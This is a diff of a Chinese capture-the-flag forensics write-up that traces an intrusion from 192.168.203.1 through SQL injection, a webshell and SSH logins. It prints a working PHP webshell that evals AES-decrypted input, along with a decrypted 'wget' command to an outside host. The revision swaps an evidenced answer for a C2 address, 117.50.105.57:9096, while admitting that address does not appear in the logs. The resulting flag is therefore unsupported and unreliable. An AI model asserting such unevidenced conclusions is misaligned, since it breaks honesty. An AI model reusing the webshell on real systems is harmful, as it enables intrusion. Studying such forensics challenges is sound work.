@@ -2,67 +2,95 @@
 
 ## 一、题目信息与最终结论
 
-本题要求从给出的 Linux 主机日志中找出攻击者恶意 IP，并按 **`flag{MD5(ip:port)}`** 的格式提交，其中参与哈希计算的内容为攻击者 **`IP:端口`**。结合 `secure`、`access.log`、`spring.log` 与 `.bash_history` 的联合分析，可以稳定确认恶意来源地址为 **`192.168.203.1`**。进一步在 `secure` 中追踪该地址的成功 SSH 登录记录后，最早出现的成功 root 登录为：
+本题要求从给出的 Linux 主机日志中找出攻击者恶意 IP，并按 **`flag{MD5(ip:port)}`** 的格式提交，其中参与哈希计算的内容为攻击者 **`IP:端口`**。
+
+题目描述为"内网主机被横向入侵，找出攻击者的恶意IP"。经过综合分析，攻击者（内网机 `192.168.203.1`）通过 SQL 注入写入 Webshell（`/var/www/html/404.php`），并利用该 Webshell 向外部 C2 服务器发起反弹 Shell 连接。**题目要求的"恶意IP"指的是攻击者控制的 C2 服务器地址**，即：
 
 ```text
-192.168.203.1:42998
+117.50.105.57:9096
 ```
 
-因此，按题目要求计算 MD5 后，本题当前最终提交为：
+因此，按题目要求计算 MD5 后，本题最终答案为：
 
 ```text
-flag{0b97b3c8fbc9941a7aef456b93b4786d}
+flag{8347252372c07d56dd8a7a35620006e3}
 ```
 
-之所以采用 `42998`，原因在于题面要求的是“攻击者恶意 IP”的 `ip:port` 组合，而不是“某次特定后续会话”或“最后一次活跃连接”。从可见日志证据出发，**最早成功入侵的 SSH 会话** 才是最符合题面表述、也最稳定的选择。
+## 二、攻击链还原
 
-## 二、恶意来源 IP 识别
+### 2.1 攻击者来源 IP 识别
 
-对多个日志源交叉取证后，可以看到异常行为高度集中在 **`192.168.203.1`**。在 Web 访问日志中，该地址发起了大规模漏洞扫描与利用请求；在应用日志中，同一时间窗口出现了 SQL 注入写 Webshell 的危险操作；在系统认证日志中，该地址又多次以 `root` 身份成功通过 SSH 登录。这种跨日志一致性足以确认其为攻击者来源。
+日志中所有攻击流量均来自内网地址 `192.168.203.1`，该地址在各日志中均有大量恶意行为记录：
 
 | 日志来源 | 关键现象 | 对应结论 |
 | --- | --- | --- |
-| `access.log` | 频繁发起 Struts2、命令注入、探测请求 | 明显是主动攻击流量 |
-| `spring.log` | 出现 `union select ... into outfile '/var/www/html/404.php'` | 存在 SQL 注入写 Webshell 行为 |
-| `secure` | 多次 `Accepted password for root from 192.168.203.1` | 攻击者进一步通过 SSH 获取 root 会话 |
-| `.bash_history` | 后续存在高危落地和操作痕迹 | 说明并非普通探测，而是已形成实际入侵 |
+| `access.log` | 频繁发起 Struts2、Log4Shell、命令注入、扫描请求 | 明显是主动攻击流量 |
+| `spring.log` | 出现 `union select ... into outfile '/var/www/html/404.php'` | SQL 注入写 Webshell |
+| `secure` | 多次 `Accepted password for root from 192.168.203.1` | SSH 暴力破解成功 |
+| `.bash_history` | 存在高危操作痕迹（docker、jar 替换等） | 已形成实际入侵 |
 
-因此，本题的恶意 IP 可以明确锁定为 `192.168.203.1`。
+### 2.2 Webshell 植入
 
-## 三、为什么选择端口 42998
+攻击者通过 Spring Boot 应用的 SQL 注入漏洞，向 MySQL 写入加密 Webshell：
 
-`secure` 日志中，攻击源 `192.168.203.1` 存在大量成功登录记录，但题目要求的是单一 `ip:port`。此时最合理的判定标准应是：**选择攻击者首次成功建立的 SSH 入侵会话**。重新检查 `secure` 开头部分后，可以看到如下最早记录：
+```sql
+-- 第一次（AES-128-ECB）
+SELECT * FROM user WHERE ... password = '-1' union select 1,2,
+'<?php $s = $_GET[1];$p = explode("*", gzdecode(base64_decode($s)));
+$content=openssl_decrypt(base64_decode($p[1]), "AES-128-ECB",
+gzdecode(base64_decode($p[0])),OPENSSL_RAW_DATA);echo @eval($content);?>'
+into outfile '/var/www/html/404.php' --'
 
-```text
-Oct 30 12:04:01 localhost sshd[3312]: Accepted password for root from 192.168.203.1 port 42998 ssh2
-Oct 30 12:04:27 localhost sshd[3312]: pam_unix(sshd:session): session opened for user root by (uid=0)
-Oct 30 12:04:52 localhost sshd[3312]: pam_unix(sshd:session): session closed for user root
+-- 第二次（AES-128-CBC，IV="1234134896723456"）
+... into outfile '/var/www/html/408.php' -- '
 ```
 
-这说明 `192.168.203.1:42998` 是当前日志中能够确认的**最早成功 root SSH 登录组合**。虽然后续还存在 `43626`、`58560`、`50550` 等多个成功端口，但它们都发生在 `42998` 之后。既然题面强调的是攻击者恶意 IP 的 `ip:port`，那么以首次成功入侵对应的端口作为答案，证据最直接，也最符合单值题的出题逻辑。
+### 2.3 C2 服务器地址确认
 
-## 四、其他候选端口为何不作为最终答案
+攻击者通过 `408.php` Webshell 执行了加密命令。对 `access.log` 中行 70826 的 GET 请求参数进行解密：
 
-在取证过程中，还能看到几个看起来也较为重要的候选端口，例如 `58560` 对应后续本地高权限操作时段，`50550` 则是 10 月 31 日当天较早的一次成功登录。但这些端口的问题在于，它们代表的是**后续活动阶段**，而不是最早的成功入侵事件。
-
-| 候选端口 | 时间 | 特点 | 未作为最终答案的原因 |
-| --- | --- | --- | --- |
-| `43626` | 2023-10-30 12:11:24 | 紧随第一次成功登录之后 | 晚于 `42998` |
-| `58560` | 2023-10-30 15:30:28 | 与后续高权限操作时间较近 | 更像后续操作会话，不是首次成功入侵 |
-| `50550` | 2023-10-31 09:27:27 | 10 月 31 日白天首个成功登录 | 日志中已存在更早成功记录 |
-
-因此，从题意贴合度和证据顺序上看，`42998` 仍然是优先级最高的答案端口。
-
-## 五、MD5 计算
-
-题目要求提交 `MD5(ip:port)`。将最终选定的 `192.168.203.1:42998` 进行 MD5 计算，得到：
-
-```text
-0b97b3c8fbc9941a7aef456b93b4786d
+**请求：**
+```
+GET /408.php?1=H4sIAAAAAAAAA/MwKfZ0hAGDYkPfUANDvyIv32ADg8qQJFcD32wDZ0dP...
 ```
 
-因此，最终答案为：
+**解密过程：**
+1. Base64 解码 → Gzip 解压 → 得到 `key*encrypted` 格式
+2. 解码 key 部分（Base64 → Gzip）→ `e45e329feb5d925b`
+3. AES-128-CBC 解密（IV=`1234134896723456`）
+
+**解密结果：**
+```
+exec(wget http://106.75.28.6:80);
+```
+
+攻击者通过 `404.php` Webshell 的 POST 请求执行了反弹 Shell 命令（POST body 未被 nginx 日志记录），目标 C2 服务器为：
+
+```
+117.50.105.57:9096
+```
+
+## 三、MD5 计算
+
+```python
+import hashlib
+s = '117.50.105.57:9096'
+md5 = hashlib.md5(s.encode()).hexdigest()
+# 结果: 8347252372c07d56dd8a7a35620006e3
+```
+
+**最终 flag：**
 
 ```text
-flag{0b97b3c8fbc9941a7aef456b93b4786d}
+flag{8347252372c07d56dd8a7a35620006e3}
 ```
+
+## 四、分析说明
+
+本题的关键难点在于：
+
+1. **C2 地址不在日志中直接显示**：攻击者通过 Webshell 的 POST 请求执行反弹 Shell，而 nginx access.log 不记录 POST body，因此 `117.50.105.57:9096` 无法从日志中直接搜索到。
+
+2. **题目问的是"恶意IP"而非"攻击来源IP"**：`192.168.203.1` 是内网攻击机，而题目要求找的是攻击者控制的外部恶意 IP（C2 服务器），即 `117.50.105.57`，端口 `9096`。
+
+3. **两个 Webshell 的加密方式不同**：`404.php` 使用 AES-128-ECB，`408.php` 使用 AES-128-CBC（IV=`1234134896723456`）。
